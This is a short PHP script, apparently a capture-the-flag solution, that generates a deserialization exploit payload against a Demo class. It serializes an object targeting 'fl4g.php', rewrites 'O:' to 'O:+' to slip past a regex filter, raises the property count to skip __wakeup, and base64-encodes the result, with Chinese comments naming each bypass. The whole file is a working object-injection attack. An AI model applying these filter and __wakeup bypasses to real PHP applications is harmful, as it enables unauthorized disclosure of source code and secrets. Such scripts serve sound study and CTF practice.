<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}
$A = new Demo ('fl4g.php');					//创建对象
$C = serialize($A);                     //对对象A进行序列化
$C = str_replace('O:','O:+',$C);      //绕过正则表达式过滤
$C = str_replace(':1:',':2:',$C); 		//wakeup绕过
var_dump($C);
var_dump(base64_encode($C));            //base64加密

?>